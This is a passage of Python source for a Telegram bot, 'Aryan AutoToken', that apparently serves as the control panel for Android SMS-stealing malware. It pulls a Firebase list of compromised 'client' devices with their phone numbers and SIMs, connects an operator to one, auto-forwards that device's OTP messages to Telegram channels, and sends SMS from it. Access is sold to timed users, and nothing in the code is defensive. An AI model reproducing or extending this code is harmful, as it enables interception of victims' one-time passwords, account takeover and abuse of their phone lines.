@R.message(W.otp_ch_input)
async def f_otp_ch_input(msg: Message, state: FSMContext, bot: Bot):
    ch_input = msg.text.strip()
    try: await bot.delete_message(msg.chat.id, msg.message_id)
    except: pass
    wait = await msg.answer("🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧.....\n")
    try:
        q    = ch_input if ch_input.startswith("-") or ch_input.startswith("@") else f"@{ch_input}"
        chat = await bot.get_chat(q)
        ch_id = chat.id; ch_ttl = chat.title or str(ch_id)
        try: await wait.delete()
        except: pass
        d = load(); uid = msg.from_user.id; u = usr(uid, d)
        u.setdefault("otp_channels", []).append(ch_id)
        save(d)
        if uid in _otp_tasks: _otp_tasks[uid].cancel()
        _otp_tasks[uid] = asyncio.create_task(otp_monitor_worker(bot, uid))
        await state.clear()
        await msg.answer(
            f"💌 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘𝗧\n\n"
            f"📢 Channel: {ch_ttl}\n\n"
            f"✅ 𝗡𝗼𝘄 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗮 𝗱𝗲𝘃𝗶𝗰𝗲 𝘃𝗶𝗮 𝗢𝗡𝗟𝗜𝗡𝗘\n"
            f"𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘄𝗶𝗹𝗹 𝗮𝘂𝘁𝗼-𝗳𝗼𝗿𝘄𝗮𝗿𝗱 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗰𝗵𝗮𝗻𝗻𝗲𝗹!",
            reply_markup=main_menu(uid, d)
        )
    except Exception as e:
        try: await wait.delete()
        except: pass
        await msg.answer(f"❌ Failed: {e}\n\n• Bot must be admin in channel\n• Channel link/ID must be correct")
        await state.clear()

@R.message(W.test_to)
async def f_test_to(msg: Message, state: FSMContext):
    await state.update_data(test_to=msg.text.strip())
    await state.set_state(W.test_msg)
    await msg.answer("💬 Now send the message text:")

@R.message(W.test_msg)
async def f_test_msg(msg: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    to   = data.get("test_to", "")
    sms  = msg.text.strip()
    await state.clear()
    asyncio.create_task(_do_token_push(bot, msg.from_user.id, to, sms, "Manual Test"))

@R.message(W.fwd_add)
async def f_fwd_add(msg: Message, state: FSMContext):
    ch = msg.text.strip(); await state.clear()
    d  = load(); uid = msg.from_user.id; u = usr(uid, d)
    u.setdefault("fwd", []).append(ch); save(d)
    await msg.answer(f"✅ Forward channel added: {ch}", reply_markup=main_menu(uid, d))

@R.message(W.adm_add)
async def f_adm_add(msg: Message, state: FSMContext, bot: Bot):
    await state.clear()
    if not is_admin(msg.from_user.id, load()): return
    try:
        uid2 = int(msg.text.strip()); d = load()
        if uid2 not in d["admins"]: d["admins"].append(uid2)
        save(d)
        await msg.answer(f"✅ Admin added: {uid2}")
        try: await bot.send_message(uid2, "🛡 You have been added as Admin in Aryan AutoToken Bot!")
        except: pass
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.usr_add_id)
async def f_usr_add_id(msg: Message, state: FSMContext):
    await state.clear()
    if not is_admin(msg.from_user.id, load()): return
    try:
        uid2 = int(msg.text.strip())
        await state.update_data(add_uid=uid2)
        await state.set_state(W.usr_add_exp)
        await msg.answer(
            f"⏱ Set expiry for {uid2}:\n\n"
            "Send hours (e.g. `24`) or `0` for permanent:",
            parse_mode="Markdown"
        )
    except: await msg.answer("❌ Invalid ID.")

@R.message(W.usr_add_exp)
async def f_usr_add_exp(msg: Message, state: FSMContext, bot: Bot):
    data = await state.get_data(); uid2 = data.get("add_uid")
    await state.clear()
    if not is_admin(msg.from_user.id, load()) or not uid2: return
    try:
        hrs     = int(msg.text.strip()); d = load()
        expires = None if hrs == 0 else time.time() + hrs * 3600
        _add_timed_user(uid2, expires, msg.from_user.id, d); save(d)
        label = "Permanent" if hrs == 0 else f"{hrs}h"
        await msg.answer(f"✅ User {uid2} added — {label}")
        try: await bot.send_message(uid2,
            f"✅ You have been granted access to Aryan AutoToken Bot!\n"
            f"⏱ Duration: {label}\n"
            f"Owner: {OWNER_USERNAME}"
        )
        except: pass
    except: await msg.answer("❌ Invalid hours.")

@R.message(W.broadcast_msg)
async def f_broadcast(msg: Message, state: FSMContext, bot: Bot):
    await state.clear()
    if not is_admin(msg.from_user.id, load()): return
    d    = load()
    text = (
        f"📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{msg.text.strip()}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"☠️ {OWNER_USERNAME}"
    )
    all_uids = list(d["users"].keys())
    wait = await msg.answer(f"📲 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 {len(all_uids)} 𝘂𝘀𝗲𝗿𝘀...")
    sent = fail = 0
    for uid_str in all_uids:
        try: await bot.send_message(int(uid_str), text); sent += 1; await asyncio.sleep(0.05)
        except: fail += 1
    try: await wait.delete()
    except: pass
    await msg.answer(
        f"✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗\n\n"
        f"📊 Results:\n✅ Sent: {sent}\n❌ Failed: {fail}"
    )

# ══════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════
@R.callback_query()
async def cb(cq: CallbackQuery, state: FSMContext, bot: Bot):
    uid  = cq.from_user.id
    data = cq.data or ""
    d    = load()

    if not can_use(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied.", show_alert=True); return
    await cq.answer()

    if data == "home":
        await sedit(cq, home_card(uid, d), main_menu(uid, d))

    elif data == "menu:firebase":
        u = usr(uid, d)
        await sedit(cq,
            f"📡 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘\n\n"
            f"Connected: {len(u.get('firebases',[]))}\n\n"
            f"𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗡𝗘𝗪 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘\n𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗨𝗥𝗟",
            kb([("🔙 Back", "home")])
        )
        await state.set_state(W.fb_url)

    elif data == "menu:online":
        u      = usr(uid, d)
        fb_url = u.get("active", {}).get("fb_url")
        if not fb_url:
            await cq.answer("❌ Connect Firebase first!", show_alert=True); return
        wait = await cq.message.edit_text("🔍 𝗦𝗲𝗮𝗿𝗰𝗵𝗶𝗻𝗴 𝗼𝗻𝗹𝗶𝗻𝗲 𝗰𝗹𝗶𝗲𝗻𝘁𝘀...")
        online = await fetch_online_devices(fb_url)
        try: await wait.delete()
        except: pass
        if not online:
            await cq.message.answer("❌ 𝗡𝗼 𝗼𝗻𝗹𝗶𝗻𝗲 𝗰𝗹𝗶𝗲𝗻𝘁𝘀 𝗮𝗰𝗿𝗼𝘀𝘀 𝗮𝗹𝗹 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲!"); return
        await cq.message.answer(
            f"🟢 Online: {len(online)}\nSelect device:",
            reply_markup=devices_kb(online)
        )

    elif data.startswith("dev:pick:"):
        dev_id   = data.split("dev:pick:")[1]
        u        = usr(uid, d)
        fb_url   = u.get("active", {}).get("fb_url", "")
        wait = await cq.message.edit_text(
            f"🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗙𝗢𝗨𝗡𝗗 ✅\n"
            f"𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗 - {dev_id[:12]}...\n\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗢𝗻𝗹𝗶𝗻𝗲?\n"
            f"𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁...... ⏳\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        all_devs = await fb_get(fb_url, "/clients.json")
        dev_data = all_devs.get(dev_id, {})
        try: await wait.delete()
        except: pass
        if not dev_data:
            await cq.message.answer("❌ Device not found!"); return
        # disconnect old
        if u.get("connected_device"):
            if uid in _otp_tasks: _otp_tasks[uid].cancel(); del _otp_tasks[uid]
            u["locked_msgs"] = {}
        u["connected_device"] = {"id": dev_id, **dev_data}
        u["selected_sim"]     = None
        u["active"]["device_id"] = dev_id
        save(d)

        sims    = dev_data.get("sims", [])
        battery = dev_data.get("battery", "N/A")
        model   = dev_data.get("modelName", "Unknown")

        rchrg_lines = []
        all_ok = True
        for sim in sims:
            ph = sim.get("phoneNumber", "")
            if ph:
                st = await check_recharge(fb_url, dev_id, ph)
                rchrg_lines.append(f"📞 {ph} - {st}")
                if "EXPIRED" in st: all_ok = False
        rchrg_st  = "✅ AVAILABLE" if all_ok else "⚠️ EXPIRED"
        rchrg_txt = "\n".join(rchrg_lines) if rchrg_lines else "⚠️ No SIM"

        tkcn  = "✅ ACTIVE" if u.get("channels") else "❌ NOT SET"
        otpcn = "✅ ACTIVE" if u.get("otp_channels") else "❌ NOT SET"

        sim_txt = ""
        for s in sims:
            sim_txt += f"📶 {s.get('carrierName','N/A')}  |  📞 {s.get('phoneNumber','N/A')}  |  🎰 𝗦𝗹𝗼𝘁 {s.get('simSlotIndex',0)}\n"

        msg_text = (
            f"═══════════════════════\n"
            f"💞 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 𝗗𝗘𝗩𝗜𝗖𝗘 💞\n"
            f"═══════════════════════\n\n"
            f"🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: {dev_id}\n\n"
            f"🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆 - {battery}\n"
            f"🪩 𝗠𝗼𝗱𝗲𝗹 - {model}\n\n"
            f"📱 𝗧𝗼𝘁𝗮𝗹 𝗦𝗶𝗺𝘀: {len(sims)}\n"
            f"{sim_txt if sim_txt else '⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗱𝗲𝘃𝗶𝗰𝗲'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ 𝗥𝗘𝗖𝗛𝗔𝗥𝗚𝗘 𝗦𝗧𝗔𝗧𝗨𝗦: {rchrg_st}\n"
            f"{rchrg_txt}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟: {tkcn}\n"
            f"📨 𝗢𝗧𝗣 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚: {otpcn}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        await cq.message.answer(msg_text, reply_markup=sim_kb(sims, dev_id))
        if u.get("otp_channels"):
            if uid in _otp_tasks: _otp_tasks[uid].cancel()
            _otp_tasks[uid] = asyncio.create_task(otp_monitor_worker(bot, uid))
        # prompt token cn if not set
        if not u.get("channels"):
            await cq.message.answer(
                "═══════════════════════\n"
                "📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n"
                "═══════════════════════\n"
                "𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗗\n\n"
                "𝗝𝗮𝗵𝗮 𝗮𝗮𝗽𝗸𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗱𝗿𝗼𝗽 𝗵𝗼𝗴𝗮 𝘃𝗼 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗱𝗲\n\n"
                "💡 Use 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 to set permanent channel"
            )
            await state.set_state(W.ch_input)

    elif data.startswith("sim:"):
        parts   = data.split(":")
        dev_id  = parts[1]; sim_idx = int(parts[2])
        d       = load(); u = usr(uid, d)
        dev_data= u.get("connected_device", {})
        sims    = dev_data.get("sims", []) if isinstance(dev_data, dict) else []
        if sim_idx >= len(sims):
            await cq.answer("❌ Invalid SIM!", show_alert=True); return
        sim = sims[sim_idx]
        u["selected_sim"]     = sim
        u["active"]["sim_slot"] = sim.get("simSlotIndex", sim_idx)
        save(d)
        await cq.message.answer(
            f"═══════════════════════\n"
            f"💓 𝗦𝗜𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗘𝗗 💓\n\n"
            f"𝗡𝗨𝗠𝗕𝗘𝗥 - {sim.get('phoneNumber','N/A')}\n"
            f"𝗦𝗹𝗼𝘁 - {sim.get('simSlotIndex','N/A')}\n"
            f"𝗖𝗮𝗿𝗿𝗶𝗲𝗿 - {sim.get('carrierName','N/A')}\n"
            f"═══════════════════════"
        )
        await cq.answer("✅ 𝗦𝗜𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗘𝗗!")

    elif data.startswith("dev:pg:"):
        page   = int(data.split(":")[2])
        u      = usr(uid, d)
        fb_url = u.get("active", {}).get("fb_url", "")
        online = await fetch_online_devices(fb_url)
        await sedit(cq, f"Select device (page {page+1}):", devices_kb(online, page))

    elif data == "menu:token_cn":
        u   = usr(uid, d)
        chs = u.get("channels", [])
        txt = f"════════════════════════\n   📌 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n════════════════════════\n\n"
        if chs:
            for ch in chs:
                ttl = ch.get("title", str(ch)) if isinstance(ch, dict) else str(ch)
                txt += f"📢 {ttl}\n"
            txt += "\n✅ Status: Active\n\n"
        else:
            txt += "❌ Not set\n\n"
        txt += "𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗜𝗗:"
        await sedit(cq, txt, kb(
            [("❌ Remove All", "token_cn:remove")],
            [("🔙 Back", "home")]
        ))
        await state.set_state(W.ch_input)

    elif data == "token_cn:remove":
        u = usr(uid, d); u["channels"] = []; save(d)
        await sedit(cq, "✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗥𝗘𝗠𝗢𝗩𝗘𝗗!", main_menu(uid, d))

    elif data == "menu:otp_cn":
        u   = usr(uid, d)
        chs = u.get("otp_channels", [])
        txt = (
            f"📢 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n\n"
            f"Connected: {len(chs)}\n"
            + (f"Active ✅\n" if chs else "❌ Not set\n") +
            "\n⚠️ 𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗕𝗢𝗧 𝗜𝗦 𝗔𝗗𝗠𝗜𝗡 𝗜𝗡 𝗬𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ⚠️\n\n"
            "𝗦𝗲𝗻𝗱 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸/𝗜𝗗:"
        )
        await sedit(cq, txt, kb([("🔙 Back", "home")]))
        await state.set_state(W.otp_ch_input)

    elif data == "menu:disconnect":
        u = usr(uid, d)
        if uid in _otp_tasks: _otp_tasks[uid].cancel(); del _otp_tasks[uid]
        u["connected_device"] = None
        u["selected_sim"]     = None
        u["monitoring"]       = False
        u["locked_msgs"]      = {}

        fb_st  = "Connected ✅" if u.get("firebases") else "Not connected ❌"
        otp_st = "Connected ✅" if u.get("otp_channels") else "Not connected ❌"
        save(d)
        await sedit(cq,
            f"💔 𝗗𝗜𝗦𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗\n\n"
            f"📊 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
            f"🩸 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 - {fb_st}\n"
            f"📱 𝗗𝗲𝘃𝗶𝗰𝗲 - Disconnected ✅\n"
            f"💌 𝗢𝗧𝗣 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 - {otp_st}\n"
            f"🔄 𝗢𝗧𝗣 𝗠𝗼𝗻𝗶𝘁𝗼𝗿 - Stopped ⏸️\n\n"
            f"🔁 Firebase & OTP Channel connected hain!\n"
            f"📱 New device ke liye ONLINE press karo",
            main_menu(uid, d)
        )

    elif data == "menu:search":
        await sedit(cq,
            "🔍 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗟𝗜𝗘𝗡𝗧 𝗜𝗡𝗙𝗢\n\n"
            "𝗱𝗲𝘃𝗶𝗰𝗲𝗜𝗱/𝗠𝗼𝗱𝗲𝗹𝗡𝗮𝗺𝗲\n\nTo connect directly:",
            kb([("🔙 Back", "home")])
        )
        await state.set_state(W.dev_manual)

    elif data == "menu:status":
        u = usr(uid, d)
        await sedit(cq,
            f"{active_combo_card(u)}\n\n{stats_card(u)}",
            main_menu(uid, d)
        )

    elif data == "menu:logout":
        await sedit(cq,
            "═══════════════════════\n"
            "    ☢️ 𝗪𝗛𝗔𝗧 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧  ☢️\n"
            "═══════════════════════\n\n"
            "✅ 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 - Logout Firebase\n"
            "✅ 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 - Logout OTP\n"
            "✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 - Logout Token Channel",
            kb(
                [("🎗️ FIREBASE", "logout:firebase")],
                [("𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", "logout:otp")],
                [("𝗧𝗢𝗞𝗘𝗡 𝗖𝗡", "logout:token")],
                [("🔙 Back", "home")]
            )
        )

    elif data == "logout:firebase":
        u = usr(uid, d); u["firebases"] = []; u["active"]["fb_url"] = None; save(d)
        await sedit(cq, "✅ 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝗟𝗢𝗚𝗢𝗨𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!", main_menu(uid, d))

    elif data == "logout:otp":
        u = usr(uid, d); u["otp_channels"] = []
        if uid in _otp_tasks: _otp_tasks[uid].cancel(); del _otp_tasks[uid]
        save(d)
        await sedit(cq, "✅ 𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘 𝗟𝗢𝗚𝗢𝗨𝗧 𝗛𝗢 𝗚𝗬𝗘", main_menu(uid, d))

    elif data == "logout:token":
        u = usr(uid, d); u["channels"] = []; save(d)
        await sedit(cq, "✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗢𝗚𝗢𝗨𝗧!", main_menu(uid, d))

    elif data == "menu:bot_mode":
        if not is_admin(uid, d):
            await cq.answer("❌ Admin only!", show_alert=True); return
        cur = d.get("bot_mode", True)
        await sedit(cq,
            f"{'🟢 𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗙𝗢𝗥 𝗨𝗦𝗘𝗥𝗦' if cur else '🔴 𝗢𝗪𝗡𝗘𝗥 𝗬𝗢𝗨𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗢𝗙𝗙'}\n\n"
            f"Click to {'turn OFF' if cur else 'turn ON'}:",
            kb([("🔴 OFF BOT 🔴" if cur else "🟢 ON BOT 🟢", "toggle:bot_mode")])
        )

    elif data == "toggle:bot_mode":
        if not is_admin(uid, d): return
        d["bot_mode"] = not d.get("bot_mode", True); save(d)
        st = "🟢 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗪 𝗢𝗡\n\n𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝘂𝘀𝗲 𝗯𝗼𝘁 𝗻𝗼𝘄 ✅" if d["bot_mode"] else "🔴 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗪 𝗢𝗙𝗙\n\n𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝘂𝘀𝗲 𝗯𝗼𝘁 𝗻𝗼𝘄 ❌"
        await sedit(cq, st, main_menu(uid, d))

    elif data == "menu:broadcast":
        if not is_admin(uid, d):
            await cq.answer("❌ Admin only!", show_alert=True); return
        await sedit(cq,
            f"📲 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘\n\n"
            f"📊 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(d['users'])}\n\n"
            "𝗧𝗵𝗶𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀!",
            kb([("🔙 Back", "home")])
        )
        await state.set_state(W.broadcast_msg)

    elif data == "menu:users":
        if not is_admin(uid, d):
            await cq.answer("❌ Admin only!", show_alert=True); return
        await sedit(cq,
            f"👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n\n"
            f"Total: {len(d['users'])}\nAdmins: {len(d['admins'])}",
            kb(
                [("➕ Add User", "users:add"), ("➕ Add Admin", "users:add_admin")],
                [("🔙 Back", "home")]
            )
        )

    elif data == "users:add":
        if not is_admin(uid, d): return
        await sedit(cq, "👤 Send user Telegram ID:", kb([("🔙 Back", "home")]))
        await state.set_state(W.usr_add_id)

    elif data == "users:add_admin":
        if not is_admin(uid, d): return
        await sedit(cq, "🛡 Send Telegram ID to make admin:", kb([("🔙 Back", "home")]))
        await state.set_state(W.adm_add)

    elif data == "menu:backup":
        if not is_admin(uid, d): return
        z = make_zip()
        await bot.send_document(uid,
            BufferedInputFile(z, f"aryan_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"),
            caption="📋 Bot backup"
        )

    elif data == "menu:test":
        await sedit(cq, "📞 Send recipient number:", kb([("🔙 Back", "home")]))
        await state.set_state(W.test_to)

    elif data == "menu:fwd":
        await sedit(cq, "📤 Send forward channel ID/link:", kb([("🔙 Back", "home")]))
        await state.set_state(W.fwd_add)

    elif data == "toggle:notify":
        u = usr(uid, d); u["notify_on"] = not u.get("notify_on", True); save(d)
        st = "🔔 ON" if u["notify_on"] else "🔕 OFF"
        await cq.answer(f"Notifications: {st}", show_alert=True)

# ══════════════════════════════════════════════
#  DEV MANUAL SEARCH HANDLER
# ══════════════════════════════════════════════
@R.message(W.dev_manual)
async def f_dev_manual(msg: Message, state: FSMContext, bot: Bot):
    query = msg.text.strip().lower(); await state.clear()
    uid   = msg.from_user.id; d = load(); u = usr(uid, d)
    fb_url= u.get("active", {}).get("fb_url", "")
    if not fb_url: await msg.answer("❌ Firebase first!"); return
    wait  = await msg.answer(
        "🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗙𝗢𝗨𝗡𝗗 ✅\n"
        "𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗 - 🔍 𝗦𝗲𝗮𝗿𝗰𝗵𝗶𝗻𝗴...\n\n"
        "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗢𝗻𝗹𝗶𝗻𝗲?\n"
        "𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁...... ⏳\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    all_d   = await fb_get(fb_url, "/clients.json")
    try: await wait.delete()
    except: pass
    matched = {}
    for did, dd in all_d.items():
        name = (dd.get("modelName") or dd.get("deviceName") or did).lower()
        sims = dd.get("sims", [])
        ph   = sims[0].get("phoneNumber", "").lower() if sims else ""
        if query in did.lower() or query in name or query in ph:
            matched[did] = dd
    if not matched:
        await msg.answer("❌ 𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗!"); return
    await msg.answer(f"✅ Found {len(matched)}:", reply_markup=devices_kb(matched))

# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
async def main():
    load()
    bot = Bot(token=BOT_TOKEN)
    dp  = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me  = await bot.get_me()
    log.info(f"✅ @{me.username} — ARYAN AUTOTOKEN v5.0 STARTED")
    try:
        await bot.send_message(OWNER_ID,
            f"🚀 𝗔𝗥𝗬𝗔𝗡 𝗔𝗨𝗧𝗢𝗧𝗢𝗞𝗘𝗡 𝗩5.0 𝗢𝗡𝗟𝗜𝗡𝗘\n"
            f"@{me.username}\n"
            f"🔥 GOD SPEED · 30 TCP · 15 PARALLEL FIRE\n"
            f"⚡ ZERO DELAY MODE ACTIVE"
        )
    except: pass
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        import uvloop
        uvloop.install()
        log.info("🚀🚀🚀 UVLOOP ENABLED — MAX POWER")
    except ImportError:
        log.info("pip install uvloop for max speed.")
    asyncio.run(main())
